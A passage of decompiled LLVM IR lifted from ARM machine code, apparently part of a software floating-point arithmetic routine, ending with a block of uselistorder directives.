  %v1_1c750 = phi i32 [ %v1_1c738, %.thread8 ], [ %v3_1c738, %bb102 ]
  %v0_1c74c = phi i32 [ %v0_1c734, %.thread8 ], [ %v7_1c734, %bb102 ]
  %v2_1c788 = phi i32 [ %v1_1c740, %.thread8 ], [ %v6_1c740, %bb102 ]
  %v1_1c6ec32 = phi i32 [ %v1_1c6ec33, %.thread8 ], [ %v6_1c740, %bb102 ]
  %v1_1c70843 = phi i32 [ %v1_1c70844, %.thread8 ], [ %v6_1c740, %bb102 ]
  %v1_1c72452 = phi i32 [ %v1_1c72453, %.thread8 ], [ %v6_1c740, %bb102 ]
  %v2_1c744 = or i32 %v0_1c74c, %v1_1c750
  %v4_1c744 = icmp eq i32 %v2_1c744, 0
  br i1 %v4_1c744, label %dec_label_pc_1c784, label %dec_label_pc_1c74c

dec_label_pc_1c74c:                               ; preds = %.thread10
  %v3_1c74c = mul i32 %v0_1c74c, 16
  %v4_1c750 = udiv i32 %v1_1c750, 268435456
  %v5_1c750 = or i32 %v3_1c74c, %v4_1c750
  store i32 %v5_1c750, i32* %r5.global-to-local, align 4
  %v3_1c754 = mul i32 %v1_1c750, 16
  store i32 %v3_1c754, i32* %r6.global-to-local, align 4
  %v3_1c758 = mul nuw i32 %v3_1c728, 8
  %v4_1c75c = udiv i32 %v15_1c72c, 536870912
  %v5_1c75c = or i32 %v4_1c75c, %v3_1c758
  %v3_1c760 = mul i32 %v15_1c72c, 8
  %v3_1c764 = udiv i32 %v0_1c764, 16
  store i32 %v3_1c764, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c764, 16
  br i1 %tmp, label %dec_label_pc_1c76c, label %dec_label_pc_1c6dc

dec_label_pc_1c76c:                               ; preds = %dec_label_pc_1c74c
  %v1_1c76c = and i32 %v1_1c788.ph, 1048576
  %v2_1c76c = icmp eq i32 %v1_1c76c, 0
  br i1 %v2_1c76c, label %dec_label_pc_1c774, label %.thread11.loopexit

dec_label_pc_1c774:                               ; preds = %dec_label_pc_1c76c
  %v2_1c774 = or i32 %v2_1c788, %v1_1c788.ph
  store i32 %v2_1c774, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c6dc.outer

dec_label_pc_1c784:                               ; preds = %.thread10
  store i32 %v15_1c72c, i32* %r3.global-to-local, align 4
  store i32 %v3_1c728, i32* %r2.global-to-local, align 4
  %v1_1c784 = and i32 %v1_1c788.ph, 1048576
  %v2_1c784 = icmp eq i32 %v1_1c784, 0
  br i1 %v2_1c784, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_1c784
  %v3_1c788 = or i32 %v2_1c788, %v1_1c788.ph
  store i32 %v3_1c788, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1c76c
  store i32 %v3_1c760, i32* %r3.global-to-local, align 4
  store i32 %v5_1c75c, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1c784, %bb103
  %v1_1c790 = add nsw i32 %v4_1c6b0, 515
  store i32 %v1_1c790, i32* %ip.global-to-local, align 4
  %v2_1c790 = icmp ugt i32 %v1_1c6b4, 252
  %v7_1c790 = icmp eq i32 %v1_1c6b4, 253
  %v2_1c794 = xor i1 %v7_1c790, true
  %v3_1c794 = and i1 %v2_1c790, %v2_1c794
  br i1 %v3_1c794, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_1c794 = icmp ugt i32 %v1_1c790, 1791
  %v11_1c794 = icmp eq i32 %v1_1c790, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_1c798 = phi i1 [ %v7_1c790, %.thread11 ], [ %v11_1c794, %bb104 ]
  %v0_1c798 = phi i1 [ %v2_1c790, %.thread11 ], [ %v6_1c794, %bb104 ]
  %v2_1c798 = xor i1 %v1_1c798, true
  %v3_1c798 = and i1 %v0_1c798, %v2_1c798
  call void @__pseudo_cond_branch(i1 %v3_1c798, i32 ptrtoint (i32* @global_var_1c4c8.1692 to i32))
  %v0_1c79c = load i32, i32* %r5.global-to-local, align 4
  %v1_1c79c = load i32, i32* %r2.global-to-local, align 4
  %v2_1c79c = sub i32 %v0_1c79c, %v1_1c79c
  store i32 %v2_1c79c, i32* %ip.global-to-local, align 4
  %v3_1c79c = icmp uge i32 %v0_1c79c, %v1_1c79c
  %v9_1c79c = icmp eq i32 %v0_1c79c, %v1_1c79c
  br i1 %v9_1c79c, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_1c7a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c7a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1c7a0 = sub i32 %v1_1c7a0, %v2_1c7a0
  store i32 %v3_1c7a0, i32* %ip.global-to-local, align 4
  %v4_1c7a0 = icmp uge i32 %v1_1c7a0, %v2_1c7a0
  %v10_1c7a0 = icmp eq i32 %v1_1c7a0, %v2_1c7a0
  br i1 %v10_1c7a0, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_1c7a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c7a4 = urem i32 %v1_1c7a4, 2
  %v3_1c7a4 = icmp ne i32 %v2_1c7a4, 0
  %v4_1c7a4 = udiv i32 %v1_1c7a4, 2
  store i32 %v4_1c7a4, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_1c7a8 = phi i1 [ %v3_1c79c, %bb105 ], [ %v4_1c7a0, %bb106 ], [ %v3_1c7a4, %bb107 ]
  %v0_1c7a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c7a8 = zext i1 %v1_1c7a8 to i32
  %v3_1c7a8 = add i32 %v2_1c7a8, %v0_1c7a8
  store i32 %v3_1c7a8, i32* %r1.global-to-local, align 4
  %v0_1c7ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1c7ac = load i32, i32* %r4.global-to-local, align 4
  %v2_1c7ac = and i32 %v1_1c7ac, 4096
  %v3_1c7ac = icmp ne i32 %v2_1c7ac, 0
  %v4_1c7ac = mul i32 %v1_1c7ac, 1048576
  %v6_1c7ac = add i32 %v4_1c7ac, %v0_1c7ac
  %v7_1c7ac = zext i1 %v3_1c7ac to i32
  %v8_1c7ac = add i32 %v7_1c7ac, %v6_1c7ac
  store i32 %v8_1c7ac, i32* %r0.global-to-local, align 4
  %v2_1c7b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c7b0, i32* %r4.global-to-local, align 4
  store i32 %v6_1c650, i32* %r5.global-to-local, align 4
  store i32 %v9_1c650, i32* %r6.global-to-local, align 4
  ret i32 %v8_1c7ac

dec_label_pc_1c7b4:                               ; preds = %dec_label_pc_1c670
  %v1_1c7b4 = and i32 %v2_1c674, -2147483648
  %v4_1c7b8 = urem i32 %v1_1c65c, 1048576
  %v5_1c7b8 = or i32 %v1_1c7b4, %v4_1c7b8
  store i32 %v5_1c7b8, i32* %r0.global-to-local, align 4
  %v6_1c7bc = add nsw i32 %v2_1c670, 1023
  store i32 %v6_1c7bc, i32* %r4.global-to-local, align 4
  %v8_1c7bc = sub nsw i32 0, %v2_1c670
  %v9_1c7bc = and i32 %v6_1c7bc, %v8_1c7bc
  %v11_1c7bc = icmp slt i32 %v2_1c670, -1023
  %v12_1c7bc = icmp eq i32 %v6_1c7bc, 0
  %v7_1c7c0 = icmp sgt i32 %v2_1c670, -1023
  br i1 %v7_1c7c0, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_1c7b4
  %v10_1c7c0 = sub nsw i32 1024, %v2_1c670
  store i32 %v10_1c7c0, i32* %r5.global-to-local, align 4
  %v14_1c7c0 = and i32 %v10_1c7c0, %v6_1c7bc
  %v16_1c7c0 = icmp slt i32 %v10_1c7c0, 0
  %v17_1c7c0 = icmp eq i32 %v6_1c7bc, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_1c7b4, %bb108
  %v2_1c7c8.in = phi i32 [ %v9_1c7bc, %dec_label_pc_1c7b4 ], [ %v14_1c7c0, %bb108 ]
  %v1_1c7c8 = phi i1 [ %v11_1c7bc, %dec_label_pc_1c7b4 ], [ %v16_1c7c0, %bb108 ]
  %v0_1c7c8 = phi i1 [ %v12_1c7bc, %dec_label_pc_1c7b4 ], [ %v17_1c7c0, %bb108 ]
  %v2_1c7c8 = icmp slt i32 %v2_1c7c8.in, 0
  %v3_1c7c4 = xor i1 %v2_1c7c8, %v1_1c7c8
  %v4_1c7c4 = or i1 %v0_1c7c8, %v3_1c7c4
  br i1 %v4_1c7c4, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1c7c485 = mul i32 %v6_1c7bc, 1048576
  %v10_1c7c486 = or i32 %v9_1c7c485, %v5_1c7b8
  store i32 %v10_1c7c486, i32* %r0.global-to-local, align 4
  store i32 %v3_1c650, i32* %r4.global-to-local, align 4
  store i32 %v6_1c650, i32* %r5.global-to-local, align 4
  ret i32 %v10_1c7c486

bb111:                                            ; preds = %bb109
  %v1_1c7cc = or i32 %v5_1c7b8, 1048576
  store i32 %v1_1c7cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1c7d4 = add nsw i32 %v2_1c670, 1022
  store i32 %v1_1c7d4, i32* @r4, align 4
  %v3_1c7d4 = sub nsw i32 -1023, %v2_1c670
  %v4_1c7d4 = and i32 %v6_1c7bc, %v3_1c7d4
  %v5_1c7d4 = icmp slt i32 %v4_1c7d4, 0
  store i1 %v5_1c7d4, i1* @cpsr_v, align 1
  %v6_1c7d4 = icmp slt i32 %v2_1c670, -1022
  store i1 %v6_1c7d4, i1* @cpsr_n, align 1
  %v7_1c7d4 = icmp eq i32 %v6_1c7bc, 1
  store i1 %v7_1c7d4, i1* @cpsr_z, align 1
  %v1_1c7d8 = call i32 @function_1c4c8(i32 %v1_1c7cc)
  store i32 %v1_1c7d8, i32* %r0.global-to-local, align 4
  %v0_1c7dc = load i32, i32* @r5, align 4
  %v1_1c7dc = load i32, i32* @r6, align 4
  %v2_1c7dc = or i32 %v1_1c7dc, %v0_1c7dc
  store i32 %v2_1c7dc, i32* @lr, align 4
  %v1_1c7e0 = call i32 @function_1c4c8(i32 %v1_1c7d8)
  store i32 %v1_1c7e0, i32* %r0.global-to-local, align 4
  %v0_1c7e4.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1c7e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1c7e4

dec_label_pc_1c7e4:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_1c7e4.pre-phi = phi i32 [ %v5_1c660, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_1c660, %bb93 ], [ %v5_1c660, %bb111 ]
  %v0_1c7e8 = phi i32 [ %v5_1c65c, %.thread1 ], [ %v5_1c65c, %.thread2 ], [ %v5_1c65c, %bb93 ], [ %v0_1c7e8.pre, %bb111 ]
  %v2_1c7ec = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_1c7e4.pre, %bb111 ]
  %v5_1c7e4 = and i32 %v2_1c7ec, %v4_1c7e4.pre-phi
  store i32 %v5_1c7e4, i32* @r5, align 4
  %v4_1c7e8 = icmp eq i32 %v2_1c7ec, %v0_1c7e8
  br i1 %v4_1c7e8, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_1c7e4
  %v5_1c7ec = icmp eq i32 %v5_1c7e4, %v2_1c7ec
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_1c7e4, %bb112
  %v0_1c7f0 = phi i1 [ false, %dec_label_pc_1c7e4 ], [ %v5_1c7ec, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1c7f0, i32 ptrtoint (i32* @global_var_1c644.1693 to i32))
  %v0_1c7f4 = load i32, i32* @r4, align 4
  %v1_1c7f4 = load i32, i32* %ip.global-to-local, align 4
  %v4_1c7f4 = icmp eq i32 %v1_1c7f4, %v0_1c7f4
  br i1 %v4_1c7f4, label %dec_label_pc_1c7fc, label %dec_label_pc_1c818

dec_label_pc_1c7fc:                               ; preds = %bb113
  %v0_1c7fc = load i32, i32* @r1, align 4
  %v1_1c7fc = load i32, i32* %r0.global-to-local, align 4
  %v4_1c7fc = mul i32 %v1_1c7fc, 4096
  %v5_1c7fc = or i32 %v4_1c7fc, %v0_1c7fc
  store i32 %v5_1c7fc, i32* %r4.global-to-local, align 4
  %v1_1c800 = icmp ne i32 %v5_1c7fc, 0
  call void @__pseudo_cond_branch(i1 %v1_1c800, i32 ptrtoint (i32* @global_var_1c644.1693 to i32))
  %v0_1c804 = load i32, i32* @r5, align 4
  %v1_1c804 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c808 = icmp ne i32 %v1_1c804, %v0_1c804
  call void @__pseudo_cond_branch(i1 %v1_1c808, i32 ptrtoint (i32* @global_var_1c62c.1694 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1c814 = call i32 @function_1c644(i32 %arg3, i32 %arg4)
  store i32 %v2_1c814, i32* %r0.global-to-local, align 4
  %v1_1c818.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1c818

dec_label_pc_1c818:                               ; preds = %bb113, %dec_label_pc_1c7fc
  %v1_1c818 = phi i32 [ %v1_1c7f4, %bb113 ], [ %v1_1c818.pre, %dec_label_pc_1c7fc ]
  %v0_1c818 = load i32, i32* @r5, align 4
  %v4_1c818 = icmp eq i32 %v0_1c818, %v1_1c818
  br i1 %v4_1c818, label %dec_label_pc_1c820, label %dec_label_pc_1c818.dec_label_pc_1c834_crit_edge

dec_label_pc_1c818.dec_label_pc_1c834_crit_edge:  ; preds = %dec_label_pc_1c818
  %v1_1c834.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c834

dec_label_pc_1c820:                               ; preds = %dec_label_pc_1c818
  %v4_1c820 = mul i32 %arg3, 4096
  %v5_1c820 = or i32 %v4_1c820, %arg4
  store i32 %v5_1c820, i32* %r5.global-to-local, align 4
  %v7_1c820 = icmp eq i32 %v5_1c820, 0
  call void @__pseudo_cond_branch(i1 %v7_1c820, i32 ptrtoint (i32* @global_var_1c5e0.1695 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1c830 = call i32 @function_1c644(i32 %arg3, i32 %arg4)
  store i32 %v2_1c830, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c834

dec_label_pc_1c834:                               ; preds = %dec_label_pc_1c818.dec_label_pc_1c834_crit_edge, %dec_label_pc_1c820
  %v1_1c834 = phi i32 [ %v1_1c834.pre, %dec_label_pc_1c818.dec_label_pc_1c834_crit_edge ], [ %v2_1c830, %dec_label_pc_1c820 ]
  %v0_1c834 = load i32, i32* @r1, align 4
  %v3_1c834 = mul i32 %v1_1c834, 2
  %v4_1c834 = or i32 %v3_1c834, %v0_1c834
  store i32 %v4_1c834, i32* %r6.global-to-local, align 4
  %v6_1c834 = icmp eq i32 %v4_1c834, 0
  br i1 %v6_1c834, label %dec_label_pc_1c834._crit_edge, label %bb114

dec_label_pc_1c834._crit_edge:                    ; preds = %dec_label_pc_1c834
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_1c834
  %v4_1c838 = mul i32 %arg3, 2
  %v5_1c838 = or i32 %v4_1c838, %arg4
  store i32 %v5_1c838, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1c838, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_1c834._crit_edge, %bb114
  %v4_1c848.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1c834._crit_edge ], [ %v5_1c838, %bb114 ]
  %v0_1c83c = phi i1 [ false, %dec_label_pc_1c834._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_1c83c, i32 ptrtoint (i32* @global_var_1c578.1696 to i32))
  %v0_1c840 = load i32, i32* @r1, align 4
  %v1_1c840 = load i32, i32* %r0.global-to-local, align 4
  %v3_1c840 = mul i32 %v1_1c840, 2
  %v4_1c840 = or i32 %v3_1c840, %v0_1c840
  store i32 %v4_1c840, i32* %r4.global-to-local, align 4
  %v1_1c844 = icmp ne i32 %v4_1c840, 0
  call void @__pseudo_cond_branch(i1 %v1_1c844, i32 ptrtoint (i32* @global_var_1c62c.1694 to i32))
  store i32 %v4_1c848.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1c84c = icmp ne i32 %v4_1c848.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1c84c, i32 ptrtoint (i32* @global_var_1c5e0.1695 to i32))
  %v0_1c850 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c850 = load i32, i32* @r1, align 4
  %v2_1c850 = call i32 @function_1c644(i32 %v0_1c850, i32 %v1_1c850)
  store i32 %v2_1c850, i32* %r0.global-to-local, align 4
  ret i32 %v2_1c850

; uselistorder directives
  uselistorder i32 %v5_1c838, { 1, 0, 2 }
  uselistorder i32 %v1_1c7f4, { 1, 0 }
  uselistorder i32 %v10_1c7c0, { 2, 0, 1 }
  uselistorder i32 %v6_1c7bc, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_1c7b8, { 1, 0, 2 }
  uselistorder i32 %v2_1c7a0, { 1, 0, 2 }
  uselistorder i32 %v1_1c7a0, { 1, 0, 2 }
  uselistorder i32 %v1_1c79c, { 1, 0, 2 }
  uselistorder i32 %v0_1c79c, { 1, 0, 2 }
  uselistorder i1 %v7_1c790, { 1, 0 }
  uselistorder i32 %v2_1c774, { 1, 0 }
  uselistorder i32 %v3_1c760, { 2, 1, 0 }
  uselistorder i32 %v3_1c754, { 0, 2, 1 }
  uselistorder i32 %v5_1c750, { 2, 0, 1 }
  uselistorder i32 %v6_1c740, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1c72c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1c728, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1c734, { 0, 2, 1 }
  uselistorder i32 %v1_1c740, { 1, 0 }
  uselistorder i32 %v6_1c724, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1c710, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1c70c, { 0, 2, 1 }
  uselistorder i32 %v0_1c718, { 0, 2, 1 }
  uselistorder i32 %v1_1c724, { 1, 0 }
  uselistorder i32 %v6_1c708, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1c6f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1c6fc, { 0, 2, 1 }
  uselistorder i32 %v1_1c708, { 1, 0 }
  uselistorder i32 %v3_1c6ec, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1c6e0, { 1, 2, 0 }
  uselistorder i32 %v3_1c76013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1c75c17, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1c6e0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1c6ec, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1c788.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1c6cc, { 1, 0 }
  uselistorder i32 %v0_1c6d0, { 1, 0 }
  uselistorder i32 %v3_1c6bc, { 1, 0 }
  uselistorder i1 %v1_1c6b0, { 1, 0 }
  uselistorder i32 %v3_1c6a0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1c69c, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1c694, { 2, 1, 0 }
  uselistorder i32 %v5_1c690, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1c670, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_1c660, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1c660, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1c65c, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1c65c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1c650, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 15, 17, 18, 16, 5, 20, 2, 6, 19, 21, 3, 7, 4, 8, 9, 12, 10, 11, 13, 14, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 9, 7, 8, 6, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_1c644, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1c4c8, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 21, 22, 23, 0, 24, 25, 3, 26, 1, 4, 16, 17, 18, 5, 6, 19, 7, 20, 8, 11, 12, 10, 13, 9, 14, 15 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 31, 29, 30, 28, 26, 27, 0, 25, 3 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 6, 4, 5, 7, 8, 28, 9, 10, 2, 11, 12, 82, 83, 84, 85, 86, 87, 88, 89, 0, 90, 91, 13, 14, 92, 93, 15, 94, 95, 96, 97, 16, 98, 30, 17, 99, 100, 101, 102, 36, 37, 38, 126, 39, 127, 128, 40, 129, 130, 41, 131, 132, 133, 134, 135, 136, 103, 104, 105, 106, 107, 108, 109, 113, 114, 115, 110, 42, 116, 33, 66, 43, 63, 78, 64, 123, 124, 137, 31, 117, 118, 119, 120, 121, 122, 59, 111, 112, 65, 18, 19, 20, 21, 22, 29, 23, 24, 3, 25, 26, 34, 46, 47, 67, 68, 69, 70, 48, 71, 49, 72, 50, 73, 74, 51, 52, 44, 53, 75, 76, 54, 77, 45, 60, 61, 55, 62, 79, 32, 35, 80, 81, 56, 125, 27, 57, 58 }
  uselistorder i32 8, { 3, 4, 5, 6, 7, 8, 76, 77, 34, 9, 10, 23, 11, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 0, 1, 118, 119, 120, 121, 122, 12, 123, 84, 68, 69, 78, 124, 125, 126, 127, 33, 128, 129, 31, 130, 170, 181, 59, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 60, 131, 132, 133, 134, 135, 136, 137, 138, 139, 13, 61, 140, 43, 141, 142, 79, 143, 144, 145, 146, 147, 148, 198, 35, 85, 14, 104, 106, 86, 87, 58, 174, 173, 171, 172, 175, 176, 177, 178, 179, 180, 15, 168, 169, 2, 197, 64, 65, 62, 63, 25, 26, 40, 41, 66, 199, 151, 152, 153, 80, 154, 155, 156, 157, 32, 158, 71, 72, 159, 160, 161, 67, 162, 163, 164, 165, 39, 27, 28, 166, 167, 73, 149, 150, 88, 16, 17, 81, 36, 18, 19, 24, 20, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 74, 29, 21, 75, 30, 22, 99, 100, 70, 101, 102, 103, 38, 57, 55, 56, 37, 54, 52, 53, 51, 49, 50, 48, 47, 45, 46, 82, 83, 44, 42, 105, 107 }
  uselistorder i32 4, { 8, 9, 191, 248, 249, 192, 10, 11, 250, 251, 252, 253, 254, 101, 124, 125, 126, 255, 256, 257, 258, 259, 260, 261, 0, 12, 80, 262, 263, 264, 265, 266, 267, 268, 78, 269, 127, 128, 129, 270, 271, 102, 272, 90, 273, 13, 14, 1, 224, 274, 275, 276, 277, 278, 103, 279, 280, 281, 282, 283, 284, 104, 130, 131, 132, 133, 134, 135, 285, 136, 137, 286, 287, 105, 138, 15, 288, 16, 100, 91, 92, 17, 359, 93, 82, 18, 19, 94, 95, 360, 361, 362, 363, 96, 364, 365, 366, 367, 97, 368, 369, 370, 371, 372, 20, 373, 374, 375, 376, 377, 98, 81, 378, 379, 380, 381, 382, 383, 21, 22, 99, 289, 290, 291, 292, 106, 293, 294, 295, 296, 297, 79, 298, 299, 300, 301, 303, 302, 304, 384, 385, 386, 388, 389, 139, 140, 141, 333, 334, 335, 336, 23, 205, 142, 206, 143, 83, 207, 231, 144, 232, 233, 2, 242, 243, 244, 245, 145, 146, 208, 147, 3, 148, 209, 24, 210, 84, 149, 150, 339, 341, 340, 337, 338, 342, 343, 344, 345, 346, 347, 348, 349, 350, 151, 152, 153, 154, 324, 325, 326, 327, 328, 329, 4, 25, 330, 155, 156, 387, 305, 26, 27, 28, 29, 5, 331, 30, 157, 61, 31, 32, 158, 33, 159, 160, 161, 162, 163, 306, 34, 307, 164, 308, 309, 310, 311, 312, 313, 314, 165, 315, 316, 317, 318, 319, 320, 62, 323, 166, 167, 322, 193, 321, 35, 36, 86, 37, 38, 87, 351, 352, 194, 39, 40, 63, 64, 65, 41, 211, 42, 43, 66, 44, 45, 168, 46, 212, 213, 107, 214, 108, 215, 109, 216, 217, 218, 110, 219, 111, 220, 221, 67, 169, 222, 112, 68, 170, 113, 69, 223, 114, 70, 171, 115, 71, 226, 225, 227, 228, 88, 230, 229, 89, 116, 72, 47, 117, 172, 173, 174, 175, 176, 177, 195, 178, 179, 119, 196, 120, 48, 180, 118, 49, 197, 198, 199, 200, 201, 202, 203, 123, 50, 51, 85, 234, 235, 236, 237, 238, 239, 52, 53, 73, 181, 240, 241, 182, 246, 183, 74, 75, 54, 247, 55, 56, 121, 76, 184, 122, 185, 77, 186, 187, 57, 332, 58, 59, 60, 353, 354, 355, 356, 357, 358, 188, 189, 190, 6, 7, 204 }
  uselistorder i32 32, { 69, 70, 71, 72, 37, 38, 45, 58, 59, 40, 73, 39, 46, 74, 75, 76, 77, 43, 78, 79, 80, 81, 0, 82, 83, 60, 84, 85, 86, 87, 88, 89, 90, 91, 103, 47, 48, 41, 92, 52, 26, 93, 94, 63, 64, 4, 3, 6, 5, 8, 7, 1, 42, 95, 25, 96, 2, 53, 97, 98, 99, 100, 101, 27, 102, 61, 62, 104, 54, 55, 10, 9, 29, 12, 11, 28, 14, 13, 30, 44, 65, 66, 67, 16, 15, 31, 18, 17, 32, 49, 56, 68, 33, 20, 19, 22, 21, 34, 35, 24, 23, 36, 50, 51, 57 }
  uselistorder i32 33, { 4, 5, 6, 2, 7, 8, 9, 1, 0, 3 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 40, 38, 41, 39, 44, 42, 45, 43, 47, 46, 49, 48, 51, 50, 53, 52 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 150, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 151, 35, 36, 37, 42, 38, 39, 41, 40, 43, 44, 45, 47, 46, 48, 49, 50, 0, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 146, 79, 80, 152, 81, 153, 82, 154, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 147, 1, 96, 97, 100, 99, 98, 103, 102, 101, 104, 105, 106, 107, 108, 145, 113, 109, 110, 114, 111, 112, 148, 115, 117, 116, 118, 119, 120, 123, 121, 122, 124, 125, 126, 128, 127, 129, 130, 131, 134, 132, 133, 135, 136, 138, 137, 139, 140, 141, 142, 143, 144, 149 }
  uselistorder i32 1048576, { 19, 0, 1, 2, 20, 21, 13, 3, 4, 5, 22, 6, 7, 23, 24, 14, 15, 8, 9, 25, 26, 27, 18, 28, 10, 16, 11, 17, 12 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
